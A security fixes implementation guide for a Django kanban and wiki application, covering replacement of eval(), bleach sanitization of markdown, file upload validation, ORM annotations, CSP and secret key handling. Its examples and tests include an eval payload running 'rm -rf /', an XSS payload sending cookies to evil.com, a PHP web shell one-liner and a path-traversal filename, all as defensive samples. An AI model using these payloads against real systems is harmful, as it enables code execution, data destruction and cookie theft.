# Security Fixes Implementation Guide

**Priority:** CRITICAL  
**Date:** November 14, 2025  
**Status:** Implementation Required

---

## Critical Security Fixes Required

This document provides step-by-step implementation of critical security fixes identified in the security audit.

---

## Fix 1: Remove eval() Usage (CRITICAL - RCE Vulnerability)

### Current Vulnerable Code

**File:** `kanban/forms/__init__.py` (Line 331)

```python
# DANGEROUS CODE - DO NOT USE
instance.required_skills = eval(required_skills_input)
```

### Security Risk

- **Severity:** CRITICAL
- **Impact:** Remote Code Execution (RCE)
- **Exploitability:** HIGH
- **Attack Example:**
  ```python
  required_skills_input = "__import__('os').system('rm -rf /')"
  ```

### Fix Implementation

Replace with safe JSON parsing:

```python
# SAFE IMPLEMENTATION
import json
from django.core.exceptions import ValidationError

def clean_required_skills(self):
    """Safely parse required skills from JSON string"""
    required_skills_input = self.cleaned_data.get('required_skills_text', '').strip()
    
    if not required_skills_input:
        return []
    
    # Try to parse as JSON array
    try:
        skills = json.loads(required_skills_input)
        
        # Validate it's a list
        if not isinstance(skills, list):
            raise ValidationError("Required skills must be a JSON array")
        
        # Validate all items are strings
        if not all(isinstance(skill, str) for skill in skills):
            raise ValidationError("All skills must be strings")
        
        # Limit array size
        if len(skills) > 50:
            raise ValidationError("Maximum 50 skills allowed")
        
        # Limit string length
        for skill in skills:
            if len(skill) > 100:
                raise ValidationError("Skill name too long (max 100 characters)")
        
        return skills
        
    except json.JSONDecodeError as e:
        raise ValidationError(f"Invalid JSON format: {e}")
    except ValueError:
        raise ValidationError("Invalid required skills format. Must be valid JSON array.")
```

### Complete Fixed Version

Replace the entire `save()` method in the TaskForm:

```python
def save(self, commit=True):
    instance = super().save(commit=False)
    
    # Process required skills safely (NO eval!)
    required_skills_input = self.cleaned_data.get('required_skills_text', '').strip()
    
    if required_skills_input:
        try:
            # Only use JSON parsing - NEVER eval()
            skills = json.loads(required_skills_input)
            
            # Validate
            if isinstance(skills, list) and all(isinstance(s, str) for s in skills):
                instance.required_skills = skills[:50]  # Limit to 50 items
            else:
                instance.required_skills = []
        except (json.JSONDecodeError, ValueError):
            # If parsing fails, set to empty list
            instance.required_skills = []
    elif not instance.required_skills:
        instance.required_skills = []
    
    # Process risk indicators from text field
    risk_indicators_text = self.cleaned_data.get('risk_indicators_text', '').strip()
    if risk_indicators_text:
        indicators = [line.strip() for line in risk_indicators_text.split('\n') if line.strip()]
        instance.risk_indicators = indicators[:50]  # Limit to 50 items
    elif not instance.risk_indicators:
        instance.risk_indicators = []
    
    # Process mitigation strategies from text field
    mitigation_text = self.cleaned_data.get('mitigation_strategies_text', '').strip()
    if mitigation_text:
        strategies = [line.strip() for line in mitigation_text.split('\n') if line.strip()]
        instance.mitigation_strategies = strategies[:50]  # Limit to 50 items
    elif not instance.mitigation_strategies:
        instance.mitigation_strategies = []
    
    if commit:
        instance.save()
        if hasattr(self, 'save_m2m'):
            self.save_m2m()
    
    return instance
```

### Testing the Fix

```python
# Test safe JSON parsing
import json

# Valid inputs
test_inputs = [
    '["Python", "Django", "React"]',  # Valid
    '[]',  # Empty array
    '["Skill 1"]',  # Single item
]

for test in test_inputs:
    try:
        result = json.loads(test)
        print(f"✓ {test} -> {result}")
    except Exception as e:
        print(f"✗ {test} -> {e}")

# Malicious inputs (should all fail)
malicious_inputs = [
    "__import__('os').system('ls')",
    "exec('print(123)')",
    "{'key': 'value'}",  # Dict instead of list
    '["' + 'A' * 1000 + '"]',  # Too long
]

for test in malicious_inputs:
    try:
        result = json.loads(test)
        print(f"✗ ACCEPTED (BAD): {test}")
    except Exception as e:
        print(f"✓ REJECTED (GOOD): {test}")
```

---

## Fix 2: Sanitize Markdown Output (CRITICAL - XSS Vulnerability)

### Current Vulnerable Code

**File:** `wiki/models.py` (Lines 82, 233)

```python
def get_html_content(self):
    """Convert markdown content to HTML"""
    return mark_safe(markdown.markdown(self.content))
```

### Security Risk

- **Severity:** CRITICAL
- **Impact:** Stored Cross-Site Scripting (XSS)
- **Exploitability:** MEDIUM-HIGH
- **Attack Example:**
  ```markdown
  [Click me](javascript:alert(document.cookie))
  <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
  ```

### Fix Implementation

#### Step 1: Install bleach library

```bash
pip install bleach==6.1.0
```

Add to `requirements.txt`:
```txt
bleach==6.1.0
```

#### Step 2: Update wiki/models.py

```python
import markdown
import bleach
from django.utils.safestring import mark_safe

class WikiPage(models.Model):
    # ... existing fields ...
    
    def get_html_content(self):
        """Convert markdown to HTML and sanitize to prevent XSS"""
        # Convert markdown to HTML
        html = markdown.markdown(
            self.content,
            extensions=[
                'markdown.extensions.fenced_code',
                'markdown.extensions.tables',
                'markdown.extensions.nl2br',
            ]
        )
        
        # Define allowed HTML tags and attributes
        allowed_tags = [
            'p', 'br', 'strong', 'em', 'u', 's', 'del', 'ins',
            'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
            'ul', 'ol', 'li',
            'a', 'code', 'pre', 'blockquote',
            'table', 'thead', 'tbody', 'tr', 'th', 'td',
            'hr', 'img'
        ]
        
        allowed_attributes = {
            'a': ['href', 'title', 'rel'],
            'img': ['src', 'alt', 'title', 'width', 'height'],
            'code': ['class'],  # For syntax highlighting
            'pre': ['class'],
        }
        
        # Allowed protocols for links
        allowed_protocols = ['http', 'https', 'mailto']
        
        # Sanitize HTML
        clean_html = bleach.clean(
            html,
            tags=allowed_tags,
            attributes=allowed_attributes,
            protocols=allowed_protocols,
            strip=True
        )
        
        # Linkify URLs (optional - converts plain URLs to links)
        clean_html = bleach.linkify(
            clean_html,
            parse_email=True,
            callbacks=[],
            skip_tags=['pre', 'code']
        )
        
        return mark_safe(clean_html)

# Same fix for MeetingNotes model
class MeetingNotes(models.Model):
    # ... existing fields ...
    
    def get_html_content(self):
        """Convert markdown to HTML and sanitize to prevent XSS"""
        html = markdown.markdown(
            self.content,
            extensions=[
                'markdown.extensions.fenced_code',
                'markdown.extensions.tables',
                'markdown.extensions.nl2br',
            ]
        )
        
        allowed_tags = [
            'p', 'br', 'strong', 'em', 'u', 's', 'del', 'ins',
            'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
            'ul', 'ol', 'li',
            'a', 'code', 'pre', 'blockquote',
            'table', 'thead', 'tbody', 'tr', 'th', 'td',
            'hr', 'img'
        ]
        
        allowed_attributes = {
            'a': ['href', 'title', 'rel'],
            'img': ['src', 'alt', 'title', 'width', 'height'],
            'code': ['class'],
            'pre': ['class'],
        }
        
        allowed_protocols = ['http', 'https', 'mailto']
        
        clean_html = bleach.clean(
            html,
            tags=allowed_tags,
            attributes=allowed_attributes,
            protocols=allowed_protocols,
            strip=True
        )
        
        clean_html = bleach.linkify(
            clean_html,
            parse_email=True,
            callbacks=[],
            skip_tags=['pre', 'code']
        )
        
        return mark_safe(clean_html)
```

### Testing the Fix

```python
# Test XSS prevention
test_cases = [
    # Malicious scripts (should be stripped)
    ('<script>alert("XSS")</script>', 'alert("XSS")'),
    ('<img src=x onerror=alert(1)>', '<img src="x">'),
    ('[Click](javascript:alert(1))', '[Click](javascript:alert(1))'),
    
    # Safe content (should be preserved)
    ('**Bold** and *italic*', '<strong>Bold</strong> and <em>italic</em>'),
    ('[Link](https://example.com)', '<a href="https://example.com">Link</a>'),
    ('![Image](https://example.com/img.png)', '<img src="https://example.com/img.png">'),
]

from wiki.models import WikiPage

for input_md, expected_contains in test_cases:
    page = WikiPage(content=input_md)
    result = page.get_html_content()
    
    # Check if malicious code is stripped
    if '<script>' in result or 'javascript:' in result or 'onerror=' in result:
        print(f"✗ VULNERABLE: {input_md[:50]}")
    else:
        print(f"✓ SAFE: {input_md[:50]}")
```

---

## Fix 3: Comprehensive File Upload Validation

### Current Vulnerable Code

**Files:** `kanban/views.py` (Lines 1869-1871), `messaging/views.py` (Lines 568-570)

```python
# INSUFFICIENT VALIDATION
file_obj.filename = request.FILES['file'].name
file_obj.file_size = request.FILES['file'].size
file_obj.file_type = request.FILES['file'].name.split('.')[-1].lower()
```

### Security Risks

- File extension spoofing
- Malicious file upload (web shells, malware)
- Path traversal
- Resource exhaustion

### Fix Implementation

#### Step 1: Install python-magic

```bash
pip install python-magic-bin==0.4.14  # Windows
# OR
pip install python-magic==0.4.27      # Linux/Mac
```

Add to `requirements.txt`:
```txt
python-magic-bin==0.4.14  # Windows
```

#### Step 2: Create File Validation Utility

**File:** `kanban/utils/file_validators.py`

```python
"""
Secure file upload validators
"""
import magic
import os
from django.core.exceptions import ValidationError
from django.conf import settings


class FileValidator:
    """Comprehensive file upload validation"""
    
    # Allowed MIME types with their extensions
    ALLOWED_TYPES = {
        'application/pdf': ['pdf'],
        'application/msword': ['doc'],
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': ['docx'],
        'application/vnd.ms-excel': ['xls'],
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': ['xlsx'],
        'application/vnd.ms-powerpoint': ['ppt'],
        'application/vnd.openxmlformats-officedocument.presentationml.presentation': ['pptx'],
        'image/jpeg': ['jpg', 'jpeg'],
        'image/png': ['png'],
        'image/gif': ['gif'],
        'text/plain': ['txt'],
        'text/csv': ['csv'],
    }
    
    MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
    
    @classmethod
    def validate_file(cls, uploaded_file):
        """
        Comprehensive file validation
        
        Args:
            uploaded_file: Django UploadedFile object
            
        Raises:
            ValidationError: If file is invalid
        """
        # 1. Check file size
        if uploaded_file.size > cls.MAX_FILE_SIZE:
            raise ValidationError(
                f'File too large. Maximum size is {cls.MAX_FILE_SIZE / (1024*1024):.1f}MB'
            )
        
        if uploaded_file.size == 0:
            raise ValidationError('File is empty')
        
        # 2. Check file extension
        filename = uploaded_file.name
        ext = cls._get_extension(filename)
        
        if not ext:
            raise ValidationError('File has no extension')
        
        # 3. Validate filename
        cls._validate_filename(filename)
        
        # 4. Check MIME type from content (magic bytes)
        uploaded_file.seek(0)
        file_content = uploaded_file.read(8192)  # Read first 8KB
        uploaded_file.seek(0)
        
        mime = magic.from_buffer(file_content, mime=True)
        
        # 5. Verify MIME type is allowed
        if mime not in cls.ALLOWED_TYPES:
            raise ValidationError(
                f'File type not allowed: {mime}. Allowed types: PDF, Word, Excel, PowerPoint, Images'
            )
        
        # 6. Verify extension matches MIME type
        allowed_extensions = cls.ALLOWED_TYPES[mime]
        if ext not in allowed_extensions:
            raise ValidationError(
                f'File extension .{ext} does not match content type {mime}'
            )
        
        # 7. Additional security checks
        cls._check_malicious_content(file_content, mime, ext)
        
        return True
    
    @staticmethod
    def _get_extension(filename):
        """Extract file extension safely"""
        if '.' not in filename:
            return None
        return filename.rsplit('.', 1)[1].lower()
    
    @staticmethod
    def _validate_filename(filename):
        """Validate filename for security"""
        # Check for path traversal
        if '..' in filename or '/' in filename or '\\' in filename:
            raise ValidationError('Invalid filename: path traversal detected')
        
        # Check for null bytes
        if '\x00' in filename:
            raise ValidationError('Invalid filename: null bytes detected')
        
        # Check length
        if len(filename) > 255:
            raise ValidationError('Filename too long (max 255 characters)')
        
        # Check for suspicious characters
        suspicious_chars = ['<', '>', ':', '"', '|', '?', '*']
        if any(char in filename for char in suspicious_chars):
            raise ValidationError('Filename contains invalid characters')
    
    @staticmethod
    def _check_malicious_content(content, mime, ext):
        """Check for malicious content patterns"""
        # Check for embedded scripts in images
        if mime.startswith('image/'):
            dangerous_patterns = [
                b'<?php',
                b'<script',
                b'javascript:',
                b'onerror=',
                b'onload=',
            ]
            
            content_lower = content.lower()
            for pattern in dangerous_patterns:
                if pattern in content_lower:
                    raise ValidationError('Suspicious content detected in image file')
        
        # Check for Office macros (simplified check)
        if mime in ['application/vnd.ms-excel', 'application/msword']:
            # These old formats can contain macros
            # In production, consider using python-oletools for deeper inspection
            pass
    
    @staticmethod
    def sanitize_filename(filename):
        """Sanitize filename to prevent security issues"""
        # Remove path components
        filename = os.path.basename(filename)
        
        # Replace spaces and special characters
        filename = filename.replace(' ', '_')
        
        # Remove any remaining dangerous characters
        safe_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-'
        filename = ''.join(c if c in safe_chars else '_' for c in filename)
        
        # Limit length
        if len(filename) > 100:
            name, ext = filename.rsplit('.', 1)
            filename = name[:95] + '.' + ext
        
        return filename
```

#### Step 3: Update TaskFileForm

**File:** `kanban/forms/__init__.py`

```python
from kanban.utils.file_validators import FileValidator

class TaskFileForm(forms.ModelForm):
    class Meta:
        model = TaskFile
        fields = ['file', 'description']
    
    def clean_file(self):
        """Validate uploaded file"""
        file = self.cleaned_data.get('file')
        
        if not file:
            raise forms.ValidationError('No file provided')
        
        # Comprehensive validation
        try:
            FileValidator.validate_file(file)
        except ValidationError as e:
            raise forms.ValidationError(str(e))
        
        return file
    
    def save(self, commit=True):
        instance = super().save(commit=False)
        
        if self.cleaned_data.get('file'):
            file = self.cleaned_data['file']
            
            # Sanitize filename
            instance.filename = FileValidator.sanitize_filename(file.name)
            instance.file_size = file.size
            instance.file_type = FileValidator._get_extension(file.name)
        
        if commit:
            instance.save()
        
        return instance
```

#### Step 4: Update ChatRoomFileForm

**File:** `messaging/forms.py`

```python
from kanban.utils.file_validators import FileValidator

class ChatRoomFileForm(forms.ModelForm):
    class Meta:
        model = ChatRoomFile
        fields = ['file', 'description']
    
    def clean_file(self):
        """Validate uploaded file"""
        file = self.cleaned_data.get('file')
        
        if not file:
            raise forms.ValidationError('No file provided')
        
        # Comprehensive validation
        try:
            FileValidator.validate_file(file)
        except ValidationError as e:
            raise forms.ValidationError(str(e))
        
        return file
    
    def save(self, commit=True):
        instance = super().save(commit=False)
        
        if self.cleaned_data.get('file'):
            file = self.cleaned_data['file']
            
            # Sanitize filename
            instance.filename = FileValidator.sanitize_filename(file.name)
            instance.file_size = file.size
            instance.file_type = FileValidator._get_extension(file.name)
        
        if commit:
            instance.save()
        
        return instance
```

### Testing the Fix

```python
# Test file validation
from django.core.files.uploadedfile import SimpleUploadedFile
from kanban.utils.file_validators import FileValidator

# Test valid files
valid_files = [
    ('test.pdf', b'%PDF-1.4', 'application/pdf'),
    ('test.png', b'\x89PNG\r\n\x1a\n', 'image/png'),
    ('test.txt', b'Hello world', 'text/plain'),
]

for filename, content, mime in valid_files:
    file = SimpleUploadedFile(filename, content, content_type=mime)
    try:
        FileValidator.validate_file(file)
        print(f"✓ {filename} - VALID")
    except ValidationError as e:
        print(f"✗ {filename} - {e}")

# Test malicious files (should all be rejected)
malicious_files = [
    ('shell.php.txt', b'<?php system($_GET["cmd"]); ?>', 'text/plain'),
    ('test.exe', b'MZ\x90\x00', 'application/x-msdownload'),
    ('../../etc/passwd', b'root:x:0:0', 'text/plain'),
    ('test\x00.php', b'<?php', 'text/plain'),
]

for filename, content, mime in malicious_files:
    file = SimpleUploadedFile(filename, content, content_type=mime)
    try:
        FileValidator.validate_file(file)
        print(f"✗ {filename} - ACCEPTED (VULNERABLE)")
    except ValidationError as e:
        print(f"✓ {filename} - REJECTED: {e}")
```

---

## Fix 4: Remove SQL `.extra()` Queries

### Current Risky Code

**File:** `kanban/views.py` (Lines 106, 122, 138, 153)

```python
# RISKY PATTERN - Uses .extra() with raw SQL
my_tasks = my_tasks_query.extra(
    select={
        'priority_order': """
            CASE priority 
                WHEN 'urgent' THEN 1 
                WHEN 'high' THEN 2 
                ...
        """
    }
).order_by('priority_order')
```

### Security Risk

- Currently safe (hardcoded values)
- Dangerous pattern if user input added
- Hard to maintain and review

### Fix Implementation

Replace with Django ORM annotations:

```python
from django.db.models import Case, When, IntegerField, F, Value
from django.db.models.functions import Coalesce

# Replace all .extra() calls with ORM annotations

if sort_by == 'due_date':
    # Sort by: 1) Due date (soonest first), 2) Priority, 3) Creation date
    my_tasks = my_tasks_query.annotate(
        priority_order=Case(
            When(priority='urgent', then=Value(1)),
            When(priority='high', then=Value(2)),
            When(priority='medium', then=Value(3)),
            When(priority='low', then=Value(4)),
            default=Value(5),
            output_field=IntegerField()
        ),
        # Null dates sort last
        due_date_order=Case(
            When(due_date__isnull=True, then=Value(1)),
            default=Value(0),
            output_field=IntegerField()
        )
    ).order_by('due_date_order', 'due_date', 'priority_order', 'created_at')[:8]

elif sort_by == 'priority':
    # Sort by: 1) Priority level, 2) Due date, 3) Creation date
    my_tasks = my_tasks_query.annotate(
        priority_order=Case(
            When(priority='urgent', then=Value(1)),
            When(priority='high', then=Value(2)),
            When(priority='medium', then=Value(3)),
            When(priority='low', then=Value(4)),
            default=Value(5),
            output_field=IntegerField()
        ),
        due_date_order=Case(
            When(due_date__isnull=True, then=Value(1)),
            default=Value(0),
            output_field=IntegerField()
        )
    ).order_by('priority_order', 'due_date_order', 'due_date', 'created_at')[:8]

elif sort_by == 'recent':
    # Sort by: 1) Most recently created/updated, 2) Priority
    my_tasks = my_tasks_query.annotate(
        priority_order=Case(
            When(priority='urgent', then=Value(1)),
            When(priority='high', then=Value(2)),
            When(priority='medium', then=Value(3)),
            When(priority='low', then=Value(4)),
            default=Value(5),
            output_field=IntegerField()
        )
    ).order_by('-updated_at', '-created_at', 'priority_order')[:8]

else:  # Default: 'urgency'
    # Sort by: 1) Overdue tasks first, 2) Priority level, 3) Due date
    from django.utils import timezone
    
    my_tasks = my_tasks_query.annotate(
        is_overdue=Case(
            When(due_date__lt=timezone.now(), then=Value(1)),
            default=Value(0),
            output_field=IntegerField()
        ),
        priority_order=Case(
            When(priority='urgent', then=Value(1)),
            When(priority='high', then=Value(2)),
            When(priority='medium', then=Value(3)),
            When(priority='low', then=Value(4)),
            default=Value(5),
            output_field=IntegerField()
        )
    ).order_by('-is_overdue', 'priority_order', 'due_date', 'created_at')[:8]
```

---

## Fix 5: Add Content Security Policy (CSP)

### Install django-csp

```bash
pip install django-csp==3.8
```

Add to `requirements.txt`:
```txt
django-csp==3.8
```

### Update settings.py

```python
# Add to INSTALLED_APPS
INSTALLED_APPS = [
    # ... existing apps ...
    'csp',
]

# Add to MIDDLEWARE (after SecurityMiddleware)
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'csp.middleware.CSPMiddleware',  # Add this
    # ... rest of middleware ...
]

# Configure CSP
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net")
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net")
CSP_IMG_SRC = ("'self'", "data:", "https:")
CSP_FONT_SRC = ("'self'", "data:", "https://cdn.jsdelivr.net")
CSP_CONNECT_SRC = ("'self'", "wss:", "ws:")
CSP_FRAME_ANCESTORS = ("'none'",)
CSP_BASE_URI = ("'self'",)
CSP_FORM_ACTION = ("'self'",)

# Enable CSP reporting (optional)
CSP_REPORT_ONLY = False  # Set to True for testing
CSP_REPORT_URI = '/csp-report/'  # Optional: endpoint to receive reports
```

---

## Fix 6: Improve Secret Key Handling

### Update settings.py

```python
import sys

# SECRET_KEY - MUST be set in environment
SECRET_KEY = os.getenv('SECRET_KEY')

# In production, fail if SECRET_KEY not set
if not SECRET_KEY:
    if not DEBUG:
        print("ERROR: SECRET_KEY environment variable not set!")
        print("Please set SECRET_KEY in your .env file")
        sys.exit(1)
    else:
        # Only use default in development with warning
        print("⚠️  WARNING: Using default SECRET_KEY (development only)")
        SECRET_KEY = 'dev-secret-key-change-in-production'
```

### Create .env.example

```bash
# Django Settings
SECRET_KEY=your-secret-key-here-generate-with-django-secret-key-generator
DEBUG=False
ALLOWED_HOSTS=yourdomain.com,www.yourdomain.com

# Database (if using PostgreSQL in production)
DB_ENGINE=django.db.backends.postgresql
DB_NAME=prizmAI_db
DB_USER=prizmAI_user
DB_PASSWORD=secure_password_here
DB_HOST=localhost
DB_PORT=5432

# Email Settings
EMAIL_HOST=smtp.gmail.com
EMAIL_PORT=587
EMAIL_USE_TLS=True
EMAIL_HOST_USER=your-email@gmail.com
EMAIL_HOST_PASSWORD=your-app-password
DEFAULT_FROM_EMAIL=noreply@yourdomain.com

# API Keys
GEMINI_API_KEY=your-gemini-api-key
OPENAI_API_KEY=your-openai-api-key
GOOGLE_SEARCH_API_KEY=your-search-api-key
GOOGLE_SEARCH_ENGINE_ID=your-search-engine-id

# Google OAuth
GOOGLE_OAUTH2_CLIENT_ID=your-client-id
GOOGLE_OAUTH2_CLIENT_SECRET=your-client-secret

# Security
ENABLE_WEB_SEARCH=True
```

---

## Deployment Checklist

Before deploying with these fixes:

- [ ] Remove all eval() usages
- [ ] Install and configure bleach for markdown sanitization
- [ ] Install python-magic for file validation
- [ ] Replace .extra() queries with ORM annotations
- [ ] Install and configure django-csp
- [ ] Set SECRET_KEY in environment (never in code)
- [ ] Run security tests
- [ ] Update requirements.txt
- [ ] Run migrations if any model changes
- [ ] Test all file uploads
- [ ] Test wiki pages with XSS payloads
- [ ] Test API with malicious inputs
- [ ] Review all logs for errors
- [ ] Deploy to staging first
- [ ] Run full security audit on staging
- [ ] Deploy to production

---

## Post-Deployment Monitoring

Monitor these metrics after deployment:

1. **File Upload Rejections**
   - Track validation failures
   - Review false positives

2. **CSP Violations**
   - Monitor CSP reports
   - Adjust policy as needed

3. **Error Logs**
   - Watch for JSON parsing errors
   - Check file validation errors

4. **Performance**
   - Monitor ORM query performance
   - Check markdown rendering speed

---

## Additional Security Improvements (Recommended)

### 1. Install Django Axes (Rate Limiting)

```bash
pip install django-axes==6.1.1
```

### 2. Add Two-Factor Authentication

```bash
pip install django-otp==1.3.0
pip install qrcode==7.4.2
```

### 3. Regular Security Scanning

```bash
pip install bandit safety
bandit -r . -f json -o security-report.json
safety check
```

---

**Implementation Priority:**

1. Fix eval() (CRITICAL - Do first)
2. Fix mark_safe() XSS (CRITICAL - Do second)
3. Fix file uploads (HIGH - Do third)
4. Replace .extra() queries (MEDIUM)
5. Add CSP (MEDIUM)
6. Fix secret key handling (LOW but important)

**Estimated Time:**
- Critical fixes: 2-4 hours
- All fixes: 1 day
- Testing: 1 day
- Total: 2 days

---

*Always test in development/staging before production deployment.*
